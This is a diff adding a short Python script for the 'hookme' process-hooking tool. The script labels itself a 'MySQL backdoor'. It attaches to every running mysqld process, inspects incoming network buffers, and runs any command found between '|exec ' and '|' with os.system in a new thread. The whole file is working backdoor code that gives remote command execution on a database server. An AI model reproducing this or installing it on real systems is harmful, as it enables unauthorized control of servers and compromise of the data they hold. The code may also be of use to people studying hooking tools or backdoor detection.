@@ -1,0 +1,37 @@
+import os
+import threading
+
+hookme.Debug("MySQL backdoor loaded")
+hookme.DisableIntercept()
+
+processName = "mysqld"
+listProcessId = hookme.GetProcessPid(processName)
+hookme.Debug("List of PIDs of " + processName)
+for id in listProcessId:
+	hookme.Debug(id)
+	hookme.Debug("Hooking " + processName)
+	result = hookme.Attach(id)
+	hookme.Debug(result)
+
+
+def ejecuta(payload):
+	os.system(payload)
+
+def SetRecvBuffer(buffer):
+	b = ""
+	
+	for x in buffer:
+		b += chr(x)
+	
+	primerToken = b.find("|", 0, len(b))
+	if (primerToken > -1):
+		segundoToken =  b.find("|", primerToken+1, len(b)-primerToken)
+		comando = b[primerToken+1:primerToken+6]
+		
+		if (comando == "exec "):
+			payload = b[primerToken+6:segundoToken-2]
+			hookme.Debug(payload)
+			t = threading.Thread(target=ejecuta, args=(payload,)) 
+			t.start()
+	
+	return buffer
